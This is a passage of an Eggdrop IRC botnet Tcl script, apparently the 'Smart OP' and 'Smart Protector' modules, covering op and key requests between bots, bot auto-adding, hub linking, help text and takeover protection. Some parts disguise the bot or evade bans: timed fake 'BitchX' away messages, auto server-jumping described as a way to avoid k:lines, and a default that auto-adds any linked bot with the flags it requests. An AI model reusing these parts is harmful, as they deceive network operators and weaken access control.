	putlog "[boja] \[[c o]from [unif_len $b 9][c]\] \[[c m]sop[c]\] - $a"
    }
}
### DA QUI: rivedere l 'autoadd in caso d rikiesta d op e rendere il controllo globale
### DA QUI: mettere i vari soplog (nello switch) sotto le azioni solo in caso siano andate a buon fine, non a priori
proc sop:req {b cm a} {
	global botnick server sop_aa
	set w [strl [bi $a 0]]; set c [strl [bi $a 1]]; set n [bi $a 2]; set t [bi $a 3]; set r [br $a 4 end]
	if {![matchattr $b b] && $sop_aa != "all"} {
		soplog "[c e]Denied[c] '$w' sop:req request from '[c e]$b[c]': [c e]not bot[c] and autoadd != 'all'!" ; return 0
	}
	if {[validuser $b] && ![matchattr $b b]} {
		soplog "[c e]Denied[c] '$w' sop:req request from '[c e]$b[c]': [c e]not bot[c]! Ignoring request"
		putbot $b "sop:reply Sorry, I don't recognize you as a bot: '$w' request refused." ; return 0
	}
	if {$w != "takekey" && $w != "add"} {
		if {![matchattr $b b]} { return 0 }
		if {![validchan $c]} { putbot $b "sop:reply Sorry, I don 't monitor[c e] $c[c]" ; return 0 }
		if {![botonchan $c]} { putbot $b "sop:reply Sorry, desiring channel[c e] $c[c]" ; return 0 }
	}
	switch -exact -- $w {
		"op" {
			if {![onchan $n $c]} { putbot $b "sop:reply You are [c e]not on $c[c] for me" ; return 0 }
			set q "$b requested [c n]op[c] on[c n] $c[c]" ; set Q $q
			set bh [finduser $n![getchanhost $n $c]]
			if {$bh == "*"} {
				set mh [getchanhost $n $c]
				append Q " - Ident not recognized:[c e] $n!$mh[c]"
				if {$sop_aa == "off"} {
					append Q "refusing request.."
					putbot $b "sop:reply I don 't recognize your IRC-ident ($n!$mh): '$w' sop:req request refused"
					al sop $q ; return 0
				} else { append Q ": adding host.. ;)" }
				al sop $Q ; sop_checkhost $b $mh ; set bh [finduser $n!$mh]
				putbot $b "sop:reply Added your new IRC host:[c o] [wmh $mh bot][c].."
			}
			if {[strl $bh] != [strl $n]} { append q " as $n .." } ; soplog $q
			if {[flagged $b o o $c]} {
				if {[botisop $c]} {
					if {![isop $n $c]} { putbot $b "sop:reply [c o]Oped[c] $n on $c" ; sop:mode $c +o $n }
				} else {
					putbot $b "sop:reply I am [c e]not +o[c] on[c e] $c[c].. Trying anyway.."
					sop:mode $c +o $n
				}
			} else {
				putbot $b "sop:reply Sorry, you are [c e]not +o[c] in my userlist for[c e] $c[c]"
			}
		}
		"deop" {
			soplog "$b requested that I deop $n on $c: [c o]done[c]" ; sop:mode $c -o $n $t
		}
		"kick" {
			soplog "$b requested that I kick $n from $c: [c o]done[c]"
			if {[validchan $c] && [botonchan $c] && [botisop $c]} { putkick $c $n "$r" }
		}
		"ban" {
			### t = maskhots[,Autore[,bantime]]
			set t [split $t ,]; set B [bi $t 0]; set A [bi $t 1]; set M [bi $t 2]
			if {$B == ""} { set B [wmh [getchanhost $n] ban] }
			if {$A == ""} { set q $b; set A $b } else { set q "$A (from $b)" }
			if {$M == ""} { global ban-time ; set M ${ban-time} }
			if {$c == ""} {
				newban $B $A $r $M; set Q ""
			} else {
				if {[validchan $c] && [botonchan $c] && [botisop $c]} { newchanban $c $B $A $r $M } else { newban $B $A $r $M }
				set Q " from $c"
			}
			set log "$q requested that I ban $n ($B)"; if {$Q != ""} { append log $Q }
			append log " (for $M minutes), reason:'$r': [c o]done[c]"; soplog $log
		}
		"unban" {
			soplog "$b requested that I unban him on $c: [c o]done[c]"
			foreach ban [chanbans $c] {
				if {[string compare $n $ban] || [string compare [lindex $a 3] $ban]} {
					set b1 [lindex $ban 0] ; sop:mode $c -b $b1
				}
			}
		}
		"invite" {
			if {[botisop $c]} {
				putquick "INVITE $n $c" ; soplog "$b asked for an invite to $c: [c o]done[c]"
			} else {
				soplog "$b asked for an invite to $c but I'm not chanop :("
				putbot $b "sop:reply I am [c e]not +o[c] on[c e] $c[c]"
			}
		}
		"limit" {
			set g [getchanmode $c]
			if {[string match *l* [lindex $g 0]]} {
				if {[botisop $c]} {
					set u [llength [chanlist $c]]
					set l [string range $g [expr [string last " " $g] + 1] end]
					if {[expr $l - $u] < 3} { sop:mode $c +l [expr $u + 3] }
					soplog "$b asked for a limit raise on $c: [c o]done[c]"
				} else {
					soplog "$b asked for a limit raise on $c but I'm not chanop :("
					putbot $b "sop:reply I am [c e]not +o[c] on[c e] $c[c]"
				}
			} else {
				putbot $b "sop:reply There isn't a chanlimit on $c!"
			}
		}
		"key" {
			soplog "$b requested the key for $c: [c o]done[c]"
			if {[string match *k* [lindex [getchanmode $c] 0]]} {
				putbot $b "sop:req takekey $c [lindex [getchanmode $c] 1]"
			} else {
				putbot $b "sop:reply There isn't any key on $c!"
			}
		}
		"takekey" { soplog "$b gave me the key for $c! ( [b]$n[b] )" ; putquick "JOIN $c $n" }
		"add" {
			if {$sop_aa == "off"} { return 0 }
			set d [bi $a 1] ; set D [split $d @] ; set h [bi $a 2] ; set f [bi $a 3] ; set q ""
			if {![validuser $b]} {
				if {$sop_aa == "all"} {
					addbot $b [bi $D 0]:[bi $D 1]/[bi $D 2]
					if {$h != "none"} { addhost $b [wmh $h bot] } ; chattr $b $f ; set q "all"
				} else {
					putbot $b "sop:reply Could not add remote bot $b: [c e]permission denied[c]" ; return 0
				}
			} elseif {[matchattr $b b]} {
				set ac 0
				if {$sop_aa == "all"} {
					regsub -all -- " " [getuser $b BOTADDR] "@" ca
					if {$d != $ca} { setuser $b BOTADDR [bi $D 0] [bi $D 1] [bi $D 2] ; set ac 1 }
				}
				if {[sop_checkhost $b $h]} { set q "host" }
				set cf 0
				if {$sop_aa == "all"} {
					set nf "" ; set lf [chattr $b] ; set x [string index $lf 0]
					if {$x == "+" || $x == "-"} { set lf [string range $lf 1 end] }
					if {$f == "*"} { set f "befo" }
					foreach F [split $f ""] {
						if {[lsearch -exact [split $lf ""] $F] == -1} { lappend nf $F }
					}
					regsub -all " " $nf "" nf ; if {$nf != ""} { chattr $b $nf ; set cf 1 }
				}
			} else {
				set m "Could not add host to remote bot '$b': he's [c e]not a bot here[c]!"
				putbot $b "sop:reply $m" ; soplog $m ; return 0
			}
			set m ""
			if {$q == "all"} {
				set M "Added remote bot[c o] $b[c] +$f -> [bi $D 0]:[bi $D 1]/[bi $D 2]"
				if {$h != "none"} { append M " - [wmh $h bot]" } ; append m " {$M}"
			} else {
				if {$ac} { append m " {Changed address for remote bot[c o] $b[c] -> [bi $D 0]:[bi $D 1]/[bi $D 2]}" }
				if {$q == "host"} { append m " {Added host to remote bot [c o]$b[c] -> [wmh $h bot]}" }
				if {$cf} { append m " {Changed flags for remote bot[c o] $b[c] -> +$nf}" }
			}
			foreach M $m { putbot $b "sop:reply $M" ; soplog $M }
		}
		default { al sop "[warn] [b]$b[b] sent unknown sop:req request: '[c e][b]$w[b][c]'" }
	}
}
proc sop:add_bots {} {
    global owner ; regsub -all " " $owner "" o ; set o [split $o ,]
    foreach n $o { if {![matchattr $n n]} { chattr $n +efhopxjvitmn } }
    foreach t [timers] { if {[lindex $t 1] == "sop:add_bots"} { killtimer [lindex $t 2] } }
    sop:need "" add ; timer [expr 10 + [rand 30]] sop:add_bots
}
utimer [expr 5 + [rand 20]] sop:add_bots
proc sop:chan {c} {
    foreach w "op key invite unban limit" { channel set $c need-${w} {} }
    channel set $c +enforcebans +shared +cycle -autoop -revenge -revengebot -protectops -protectfriends +nodesynch
}
proc sop:channels {} {
    foreach c [channels] { sop:chan $c }
    if {![string match "*sop:channels*" [timers]]} { timer [expr 30 + [rand 30]] sop:channels }
}
proc sop:oped {n uh h c mc v} {
    global botnick sop_delay sop_m
    if {[isbotnick $v] || [botisop $c]} { return 0 } ; set c [strl $c] ; set vh [nick2hand $v $c]
    if {![botisop $c] && [matchattr $vh b] && [islinked $vh]} {
	foreach t [utimers] { if {[string match "*sop:need*" [lindex $t 1]]} { killutimer [lindex $t 2] } }
	if {$sop_delay == "off" } { set d 0 } else { set d [rand [expr 1 + $sop_delay]] }
	if {$d == 0} { sop:need $c op } else { utimer $d "sop:need [p_test $c] op" }
	al sop "Bot[c o] $vh[c] gained ops on[c o] $c[c]: Oping botnet! ;)"
    }
    if {[info exists sop_m($c)]} {
	set i [lsearch -exact $sop_m($c) "+o $v"]
	if {$i != -1} {
	    set sop_m($c) [lreplace $sop_m($c) $i $i]
	    if {$sop_m($c) == "" || $sop_m($c) == "do" } { unset sop_m($c) }
	}
    }
}
proc sop:join {n uh h c} {
    global sop_delay ; if {![isbotnick $n]} { return 0 } ; sop:channels ; set c [strl $c]
    if {$sop_delay == "off" } { set d 1 } else { set d [expr 1 + [rand [expr 1 + $sop_delay]]] }
    sop:need $c op ; utimer $d "sop:need [p_test $c] op"
}
proc sop:cycle {c t s {m ""}} {
	if {![validchan $c]} { return 0 }
	if {$s} {
		foreach t [utimers] {
			set T [lindex $t 1]; if {[lindex $T 0] == "sop:cycle" && [lindex $T 1] == $c} { killutimer [lindex $t 2] }
		}
		sop:need $c invite ; channel set $c -inactive ; putquick "JOIN $c"
	} else {
		if {$m == ""} { set m "[boja] - Cycling" } ; putquick "PART $c :$m" ; channel set $c +inactive
		utimer $t "sop:cycle [p_test $c] $t 1"
	}
}
proc ishub {b} { return [string match *p* [botattr $b]] }
proc isalthub {b} { return [string match *a* [botattr $b]] }
proc sop:myhub {} {
    global sop_myhub ; set h "-" ; set a "-"
    foreach b [userlist b] { if {[ishub $b]} { set h $b ; break } }
    foreach b [userlist b] { if {[isalthub $b]} { set a $b ; break } }
    set sop_myhub "$h $a" ; module_save sop
}
sop:myhub ; utimer 2 "sop:myhub"
proc sop:fhl {} {
    global sop_fhl sop_myhub ; set h [bi $sop_myhub 0]
    foreach t [utimers] { if {[lindex $t 1] == "sop:fhl"} { killutimer [lindex $t 2] } }
    if {$sop_fhl == "off"} { return }
    if {$h != "-" && ![islinked $h]} { link $h } ; utimer $sop_fhl sop:fhl
}
sop:fhl
proc dcc:cycle {h i a} { global lastbind ; set lastbind "sop" ; dcc:module_interface $h $i "cycle $a" }
proc dcc:mcycle {h i a} {
    global lastbind ; set lastbind "msop"
    if {[llength $a] < 2 } { set q "A cycle" } else { set q "[bi $a 0] cycle [br $a 1 end]" }
    dcc:module_interface $h $i $q
}
proc dcc:botserv {h i a} {
    if {$a == ""} { set b "sop" ; set q "botserv" } else { set b "msop" ; set q "$a botserv" }
    global lastbind ; set lastbind $b ; dcc:module_interface $h $i $q
}
proc dcc:check {h i a} { global lastbind ; set lastbind "sop" ; dcc:module_interface $h $i "check $a" }
proc dcc:sync {h i a} { global lastbind ; set lastbind "sop" ; dcc:module_interface $h $i "sync $a" }
proc dcc:ajump {h i a} { global lastbind ; set lastbind "sop" ; dcc:module_interface $h $i "ajump $a" }
bind join - * sop:join
bind mode - *+o* sop:oped
bind raw - 404 chan_desynch
bind raw - 441 chan_desynch
bind raw - 442 chan_desynch
bind raw - 482 chan_desynch
bind need - * sop:need
unbind msg - go *msg:go
bind msg b go sop:go
bind bot b rjoin bot:rjoin
bind bot - sop:req sop:req
bind bot - sop:reply sop:doreply
bind dcc t|m botserv dcc:botserv
bind dcc o|o check dcc:check
bind dcc o|o sync dcc:sync
bind dcc o|o ajump dcc:ajump
bind dcc m|m cycle dcc:cycle
bind dcc m mcycle dcc:mcycle
proc ${m}_module_setup {h i m l G g w p} {
    global bnick server ; set a [module_array_vars $m] ; eval [module_globals $m]
    #al "testing ${m}_module_setup" "h=$h, i=$i, m=$m, l=$l, G=$G, g=$g, w=$w, p=$p, array_vars=$a"
    switch -exact $w {
	"cycle" {
	    if {$G == $g} {
		set t $sop_scycle ; set u "cycle (or .sop cycle)"
	    } else { set t $sop_bcycle ; set u "mcycle <botlist> (or .msop <botlist> cycle)" }
	    if {$p == ""} { pa $i "Usage: .$u \#channel1 \[\#channel2 \[...\]\]" ; return 0 }
	    if {!$l || ($l && [lsearch -exact [strl $G] [strl $bnick]] != -1)} {
		foreach c $p {
		    if {![validchan $c]} { pa $i "Skipping '$c': invalid channel.." ; continue }
		    sop:cycle $c $t 0
		}
	    }
	}
	"botserv" {
	    if {$server == ""} { set r "[c e]no server[c]" } else { set r "[c o]$server[c]" }
	    set r "Current server: $r"
	    if {$G == $g} { pa $i $r } else {
		if {$l} {
		    if {[lsearch -exact [strl $G] [strl $bnick]] != -1} {
			bot:module_interface $bnick 0 "$h $i module_status_report $r"
		    }
		} else { putbot $G "$m $h $i module_status_report $r" }
	    }
	}
	"check" {
	    set n ""; set N ""; set I ""; if {$p == ""} { set p [channels] }
	    foreach c $p {
		if {![validchan $c]} { lappend N $c ; continue }
		if {![botisop $c]} {
		    if {[string match *+inactive* [channel info $c]]} {
			lappend I $c
		    } else { lappend n $c }
		}
	    }
	    if {$n == ""} {
		set r "[c o]Oped[c] on "
		if {$p == [channels]} { append r "all channels!" } else { append r "$p!" }
	    } else { set r "[c e]Not oped[c] on: $n" }
	    if {$N != ""} { append r " (not monitoring: $N)" }
	    if {$I != ""} { append r " (+inactive: $I)" }
	    if {$l} {
		if {[lsearch -exact [strl $G] [strl $bnick]] == -1} { return 0 }
		bot:module_interface $bnick 0 "$h $i module_status_report $r"
	    } else {
		putbot $G "$m $h $i module_status_report $r"
	    }
	}
	"onchan" {
	    set c [bi $p 0] ; set s [bi $p 1] ; set r "Monitoring"
	    if {$c == ""} {
		append r ": "
		foreach C [channels] {
		    append r "[c o]$C[c]"
		    if {[string match *+inactive* [channel info $C]]} { append r " ([c e]+inactive[c])" }
		    append r ", "
		}
		set r "[string range $r 0 [expr [string length $r] - 3]]."
	    } else {
		append r "[c m] $c[c]: "
		if {[validchan $c]} {
		    append r "[c o]yes[c]"
		    if {[string match *+inactive* [channel info $c]]} { append r " ([c e]+inactive[c])" }
		} else { append r "[c e]no[c]" ; if {[string match "-q*" $s]} { return 0 } }
	    }
	    if {$l} {
		if {[lsearch -exact [strl $G] [strl $bnick]] == -1} { return 0 }
		bot:module_interface $bnick 0 "$h $i module_status_report $r"
	    } else {
		putbot $G "$m $h $i module_status_report $r"
	    }
	}
	"sync" {
	    set M "unban limit invite key op" ; regsub -all " " $M "[c],[c n] " q
	    regsub "limit" $q "limit raise" q ; set Q "Synched all channels (requested[c n] $q[c]) on $g"
	    if {$l && [lsearch -exact [strl $G] [strl $bnick]] == -1} { al $m $Q ; return 0 }
	    foreach c [strl [channels]] {
		foreach k $M { sop:need $c $k } ; utimer [expr 1 + [rand 5]] "sop:need [p_test $c] op"
	    }
	    if {[llength $G] == 1 && [strl $G] != [strl $bnick]} { append Q ": requested by $h (from $G)" }
	    al $m $Q
	}
	"autoclean" {
	    if {$p == ""} {
		pa $i "Usage: '.$m $w [c n][b]your-password[b][c]'"
		pa $i "[warn] This will delete from userfile all bots which are not actually linked!"
		return 0
	    }
	    if {![passwdok $h $p]} {
		pa $i "Bad password, your attempt has been logged." ; boot $h "Bye bye!"
		al security "[warn] $h failed '.$m $w': [c e]bad password[c]!"
	    }
	    set r ""
	    foreach b [userlist b] {
		if {![islinked $b] && ([strl $b] != [strl $bnick])} { lappend r $b ; deluser $b }
	    }
	    set L [llength $r]; if {$r == ""} { set q "<none>" } else { regsub -all " " $r "[c],[c n] " q }
	    pa $i "Removed bots:[c n] $q[c]"
	    al $m "Removed all non-linkd bots ($L bots) from userfile: Authorized by $h"
	}
	default {
	    module_save_changes $h $i $m $l $G $g $w $p $a
	    if {[string match "aj*" $w]} { ajump_check } ; if {$w == "fhl"} { sop:fhl }
	}
    }
}
al init "[module_name $m] (version [expr $${m}_ver]) loaded and ready!"; set ${m}_module_loaded 1; unset m
}
set smart_sop_help {%{help=sop}%{+t|+m}
###  %b.sop%b
   Standard Interface to Smart OP Module.
   Displays module status and saved settings.
See also: .msop
###  %b.sop -v%b
   Displays module status, complete command list and quick-help.
###  %b.sop ver%b
   Displays Smart OP Module version.
###  %b.sop author%b
   Displays informations about Module Author.
###  %b.sop clear%b
   Removes Smart OP configuration file.
See also: '.help clear'
###  %b.sop log%b [%bon%b] or [%boff%b]
   Enables or disabled logging for SOP routines's messages. Default
   is 'off'. If no parameters are given actual settings are showed.
See also: .check, .logs
###  %b.sop aa%b [%boff%b] or [%bhosts%b] or [%ball%b]
   Auto-Add routines are helpfull when linking 2 different botnets
   or changing bots vhosts: when set to 'all' every unknow linked
   bot will be automatically added with his address, telnet and users
   ports, global flags and host. When set to 'hosts' only new hostmasks
   for registered bots are automatically added. Default is 'all'.
Note1: this works only if smart.tcl is installed on all bots.
Note2: it's recommended to set autoadd to 'all' only on botnet-hubs
       (for shared botnets) and unshared bots, to avoid partyline
       floods and cpu & memory usage while updating parameters.
###  %b.sop bh%b [hosts-per-bot#]
   Sets the maximum number of hosts a bot can have on its user record.
   Helpfull to keep userfile size low and optimize memory usage, this
   value is checked every time an autoadd is performed, then it will
   not work while sop autoadd is set to 'off'.
   Default is 2, setting 'off' means no limits.
See also: .+host, .-host, .m+host, .m-host, .whois
###  %b.sop myhub%b
   Displays bot 's primary and alternate Hubs, including its connection
   status.
###  %b.sop fhl%b [seconds# / off]
   Enables or disables (off) Forced Hub Linking mode: to enable it,     
   just specify a numer of seconds in the range 30 - 300 and the bot
   will retry periodically to relink to its Hub. Default is 'off'.
See also: .sop myhub
###  %b.sop ajump%b [hours#] or [random] or [off]
   Enables or disables auto jumping routines; when enabled bots
   will automatically jump servers after the time specified with
   this command using a random quit message. Helpfull to prevent
   k:lines. Default is 'off'.
Note: this works only when there are linked bots and at least one of
      them is oped on all bot's channels.
###  %b.sop ajgap%b [%minutes#%b] or [%boff%b]
   When auto jumping is enabled, a random time in the range 0 - ajgap
   minutes cold be added to the standard jump-time to prevent syn-
   chronous jumping. Default is 120 minutes.
###  %b.sop red%b [number-of-bots#]
   Sets bots redundancy: when a bot needs op, invite, unban,
   limit raise, key etc. on a channel, it sends a request to the
   specified number of bots, using a smart algorithm to find best
   bots to request from. Default is 2 bots.
Note1: this works only if there are linked bots.
Note2: setting this value to a high number will cause a little
       flood while oping the botnet or inviting bots into channels,
       etc., so it's suggestable to keep it in the range 2-4
       (higher values only in case of strong desynch).
###  %b.sop scycle%b [seconds#]
   Sets the number of seconds that a single bot will stay out of
   a channel when cycling to regain ops. Default is 5 seconds.
   Valid range is 1 - 60 seconds.
See also: .cycle
###  %b.sop bcycle%b [seconds#]
   Sets the number of seconds that botnet will stay out of a
   channel when autocycling to regain ops. Default is 20 seconds.
   Valid range is 5 - 300 seconds.
See also: .mcycle
###  %b.sop delay%b [seconds#] or [off]
   Sets the number of seconds that channel modes (like ops, +l, etc..)
   are delayed to be grouped & pushed at the same time. This option
   prevents channels to be op-flooded when more than 1 bot needs to
   be oped (for example, after a mass-join or in a takeover-attempt
   situation) and prevents also botnet to be lagged due to the high
   number of op requests received from opless bots (and the same for
   other channel modes requests).
   Valid range is 1 - 7 seconds or 'off'. Default is 2 seconds.
See also: .sop red
###  %b.sop rj%b [on] or [off]
   Shows, enables or disables remote joins. If enabled, sharebots
   who just relinked will check for missing channels to join, and
   hubs will join sharebots channels.
See also: .status, .check, .join, .part, .mjoin, .mpart, .bjoin, .bpart
###  %b.sop quits%b [/path/to/quits_file] or [default]
   Lets the bot load an external Quits file, so you can have
   your own quit messages displayed when changing servers,
   autojumping, etc. Quits file MUST be in the format '1 line
   for 1 quit', so each quit msg must be in a separate line.
   Setting this to 'default' will restore TCL default quits.
Note: using '.send/.msend' commands it is possible to send a
      Quits file through the botnet.
See also: .send, .cat, .ls, .find, .get, .mv, .gzip, .gunzip
###  %b.sop cycle%b #channel1 [#channel2 [...]]
   Performs the bot to part and rejoin specified channel(s) without
   loosing channel settings. The bot will wait the specified amount
   of seconds set via '.sop scycle' in single interface mode (.cycle
   #chan or .sop cycle #chan) and the amount of seconds set via
   '.sop bcycle' in mass interface mode (.mcycle #chan or .msop
   <botlist> cycle #chan) befor rejoining #channels.
See also: '.sop scycle', '.sop bcycle', .join, .part, .mjoin, .mpart, .bjoin, .bpart
###  %b.sop botserv%b
   Shows actual bot server.
See also: .botserv
###  %b.sop check%b [#channel1 [#channel2 [...]]]
   Checks for bot ops on specified channels.
See also: .check, .status, .channels, '.sop onchan'
###  %b.sop onchan%b [#channel [-q]]
   If no #channel is specified, displays the list of all
   currently monitored channels. If a #channel is given,
   answers 'yes' if #channel is monitored, 'no' otherwise.
   If '-q' (-quite) parameter is specified, only affermative
   responses are showed (this is usefull with mass interface,
   for example '.msop A onchan #channel -q', so only monitoring
   bots will answer preventing you to read unwanted messages,
   expecially on a large botnet).
See also: .status, .channels
###  %b.sop sync%b
   Requests unban, limit raise, invite, key and ops on all bot
   channels (helpfull to fast gain ops in case of desynch).
See also: .check, .status, .channels, .botserv
###  %b.sop autoclean%b [your-password]
   Removes all non linked bots from userfile. Helpfull when
   cleaning up botnet, but extremely dangerous!
See also: .m-bot, .m-host, .mchattr, .mchaddr, .-user
%{help=msop}%{+t|+m}
###  %b.msop%b ...
   Standard Mass interface for Smart OP Module.
See also: '.help mass'
%{help=cycle}%{+m|+m}
###  %b.cycle%b #channel1 [#channel2 [...]]
   Just another bind to '.sop cycle'.
See also: .sop, '.sop scycle', .mcycle
%{help=mcycle}%{+m}
###  %b.mcycle%b <botlist> #channel1 [#channel2 [..]]
   Just another bind to '.msop <botlist> cycle'.
See also: .sop, '.sop bcycle', .cycle
%{help=botserv}%{+t|+m}
###  %b.botserv%b [botlist]
   Just another bind to '.sop botserv'.
See also: .sop
%{help=check}%{+o|+o}
###  %b.check%b [#channel1 [#channel2 [...]]]
   Just another bind to '.sop check'.
See also: '.sop check', .status, .channels
%{help=ajump}%{+t|+m}
###  %b.sop ajump%b [hours#] or [random] or [off]
   Just another bind to '.sop ajump'.
See also: '.sop ajgap'
%{help=sync}%{+o|+o}
###  %b.sync%b
   Just another bind to '.sop sync'.
See also: '.sop sync'
}
set smart_prot {set m "prot"
global bnick ${m}_module_name ${m}_module_init ${m}_module_bind ${m}_module_loaded ${m}_noconf_commands
global nick_kicked nick_module_loaded nick_cycle nick_cycle_ori nick_time nick_time_ori sop_red
global splits_module_conf split_serv split_quit prot_lev_orig prot_eb_orig prot_mo prot_auth
set ${m}_module_name "Smart Protector"
set ${m}_module_bind "m|m"
set ${m}_help_list "{dcc $m m|m} {dcc m${m} m|m} {dcc eb m|m} {dcc limit m|m} {dcc splits t|m}"
# {0=var_name 1=read-only_flag 2=value 3=description 4=kind 5=override_flags 6=notes 7=no-log_flag}
set ${m}_module_init {
    {ver 1 "4.5" "Version"}
    {author 1 "^Boja^ <boja@avatarcorp.org>" "Author"}
    {bh 0 "-" "Bitch Hub Mode" "" n "Don 't forget all alternate hubs (+a) in your list!" }
    {timeout 0 12 "User Timeout" "%d:3 30|off" n|n}
    {msg 0 "Never touch my friends! (%nick rulezZz)" "Punish Message" "" "" "Macros: %n = victim 's nick"}
    {bantime 0 10 "Punish Ban Time" "%d:3 30"}
    {split 0 10 "Split Alert Timeout" "%d:5 180|off" n}
    {collide 0 off "Anti Nick Collide" "%d:90 600|off" n "If you don 't like k:lines, keep it >= 120.. See also: '.nick', '.setup' and '.prot collide': it depends on 'nick' module and works only for '.prot split' != off.."}
    {banlist(all) 0 off "Banlist Checking" "%k:on off:%c" n|n}
    {notice(all) 0 off "Channel Notices" "%k:on off:%c"}
    {level(all) 0 low "Protection Level" "%k:off low medium high nightmare:%c" n|n "Never set 'nightmare' level manually if you don 't really know what you 're doing! (see '.help prot')"}
    {fake(all) 0 off "Anti Fake Mode" "%k:on off:%c" n}
    {fakex 0 n "Anti Fake Exempt" "%f" n}
    {authtime 0 60 "Authentication Time" "%d:5 720" n "Use '.prot auth passwd' to authenticate yourself!"}
    {eb(all) 0 off "Extra Bitch Mode" "%k:off notice deop kick ban:%c" n}
    {ebex 0 n|n "Extra Bitch Exempt" "%f" n}
    {ebmsg 0 "Please, never op manually" "Extra Bitch Message"}
    {limit(all) 0 "off" "Channels Limiter" "%d,%d:1 15|_off,1 15:%c"}
    {leb(all) 0 "kick" "Limit Extra Bitch" "%k:off notice deop kick ban" }
    {lebex 0 m|m "Limit EBitch Exempt" "%f" n|n}
}

set ${m}_noconf_commands {
    {auth 1 n}
}

module_init $m ; eval [module_globals $m]

proc ${m}_what_script {h m v a n w} {
    eval [module_globals $m] ; set r ""
    switch -exact -- $v {
	"timeout" - "collide" { if {[expr $${m}_$v] != "off" || $w == "parse"} { set r "seconds" } }
	"bantime" - "authtime" { set r "minutes" }
	"split" { if {$prot_split != "off" || $w == "parse" } { set r "minutes" } }
	"msg" - "ebmsg" { if {$w == "parse"} { set r "punish message" } }
	"fakex" - "ebex" - "lebex" {
	    if {$w != "parse"} { set r "flagged-users" }
	    if {[lsearch -exact "status info" $w] != -1} {
		set f ${m}_$v ; set F "flagged $h [split [expr $${f}] |]"
		if {[eval $F]} { set q "[c o]yes[c]" } else { set q "[c e]no[c]"} ; append r " (you:$q)"
	    }
	}
	"limit" {
	    if {$n == 0} {
		if {[info exists prot_limit($a)] && ([lindex $prot_limit($a) $n] != "off" || $w == "parse")} { set r "joins" }
	    } else { set r "minutes" }
	}
	"bh" {
	    if {$w == "parse"} { set r "Hub-1,Hub-2,..,Hub-N [c]/[c m] [b]-[b]" } else {
		if {$prot_bh == "-"} { set r "(disabled)" } else { set r "(enabled)" }
	    }
	}
	default {}
    }
    return $r
}
proc prot_start {} {
    set m prot ; eval [module_globals $m]
    if {$prot_bh == "-"} { unb link * prot_bh_check } else { bind link -|- * prot_bh_check }
    set e 0 ; foreach n [array names prot_fake] { if {$prot_fake($n) != "off"} { set e 1; break } }
    if {$e} { bind raw - MODE prot_mdeop } else { unb raw MODE prot_mdeop }
    set e 0 ; foreach n [array names prot_level] { if {$prot_level($n) != "off"} { set e 1; break } }
    if {$e} {
	bind mode - *-o* prot_deoped ; bind kick - * prot_kicked ; bind join - * prot_reop
	bind mode - *+b* prot_banned ; bind flud - * prot_flood
    } else {
	unb mode *-o* prot_deoped ; unb kick * prot_kicked ; unb join * prot_reop
	unb mode *+b* prot_banned ; unb flud * prot_flood
    }
    set e 0 ; foreach n [array names prot_eb] { if {$prot_eb($n) != "off"} { set e 1; break } }
    if {$e} { bind mode - *+o* proteb_check } else { unb mode *+o* proteb_check }
    foreach t [timers] { if {[string match *protlim_check* [lindex $t 1]]} { killtimer [lindex $t 2] }}
    foreach t [utimers] { if {[string match *protlim_check* [lindex $t 1]]} { killutimer [lindex $t 2] }}
    set e 0 ; foreach n [array names prot_limit] { if {$prot_limit($n) != "off"} { set e 1; break } }
    if {$e} { utimer 7 protlim_check }
    set e 0 ; foreach n [array names prot_leb] { if {$prot_leb($n) != "off"} { set e 1; break } }
    if {$e} { bind mode - *-l* protlim_ebcheck } else { unb mode *-l* protlim_ebcheck }
}
proc prot_punish {n uh c v vh w on} {
    global prot_level prot_bantime prot_msg
    if {[info exists prot_level($c)]} { set k $c } else { set k "all" }
    regsub -all "%nick" $prot_msg $v mex
    switch -exact $prot_level($k) {
	"off" { return 0 }
	"low" { puthelp "NOTICE $n :[boja] - [b]$mex[b]" }
	"medium" { sop:mode $c -o $n do ; utimer 1 "puthelp \"NOTICE $n :\[boja\] - [b]$mex[b]\"" }
	"high" { putkick $c $n "[boja] - [b]$mex[b]" }
	"nightmare" { set b [wmh $uh ban] ; putkick $c $n "[boja] - [b]$mex[b]"
	    newchanban $c $b "Protector" "$w $vh ( $v ) $on $c" [expr $prot_bantime + [rand 10]] sticky
	}
	default { al prot "[c e]Invalid[c] protection level: [c e][b]$prot_level($c)[b][c].. Deoping $n.."
	    sop:mode $c -o $n do ; utimer 1 "puthelp \"NOTICE $n :\[boja\] - [b]$mex[b]\""
	}
    }
}
proc prot_away {w} {
    global botnick
    if {$w} {
	putserv "AWAY :is away: (Auto-Away after 10 mins) \[BX-MsgLog On\]"
	al prot "$botnick set AWAY ( Bitch-X fake )" ; set w 0
    } else { putserv "AWAY" ; al prot "$botnick set BACK ( Bitch-X fake )" ; set w 1 }
    if {![string match "*prot_away $w*" [timers]]} { timer [expr [rand 300] + 10] "prot_away $w" }
}
prot_away [rand 3]
proc prot_unfl w {
    global prot_f ; if {[string match "*prot_unfl $w*" [utimers]]} { return 0 }
    if {[info exists prot_f($w)]} { unset prot_f($w) }
}
proc prot_flood {n uh h t c} {
    global prot_level prot_bantime prot_f prot_fnet prot_fake prot_fakex prot_mo prot_auth
    set t [strl $t] ; set c [strl $c] ; set S 0
    if {(![info exists prot_level($c)] && $prot_level(all) == "off") || ([info exists prot_level($c)] && $prot_level($c) == "off")} { set p_chk 0 } else { set p_chk 1 }
    if {(![info exists prot_fake($c)] && $prot_fake(all) == "off") || ([info exists prot_fake($c)] && $prot_fake($c) == "off")} { set f_chk 0 } else { set f_chk 1 }
    if {!$p_chk && !$f_chk} { return 0 }
    if {!$f_chk && (($c != "*" && [flagged $h f f $c]) || [flagged $h o])} { return 1 }
    if {[info exists prot_auth($h)] && $prot_auth($h)} { set S 1 ; set SQ "Authenticated" }
    if {(([string length $prot_fakex] < 2 || $prot_fakex == "permowner") && [flagged $h $prot_fakex]) || ([string length $prot_fakex] > 1 && [eval "flagged $h [split $prot_fakex |] $c"])} {
	set S 1 ; set SQ "flagged[c o] $prot_fakex[c]"
    }
    if {$S} { al prot "[c o]Skipping[c] Anti-Fake alert for[c o] $h[c] on $c: $SQ" ; return 0 }
    if {![info exists prot_f($uh@$c)]} { set prot_f($uh@$c) 1 } else { incr prot_f($uh@$c) }
    switch -exact -- $t {
	deop - kick {
	    set k "Sorry, I don 't like takeovers.." ; set b "Mass $t on $c from $n!$uh"
	    if {$f_chk} {
		set q "[warn] Possible [c n][b]TakeOver[b][c] attempt on [c n][b]$c[b][c]! Anti-Fake protections enabled: kicking [c n]$n!$uh[c]"
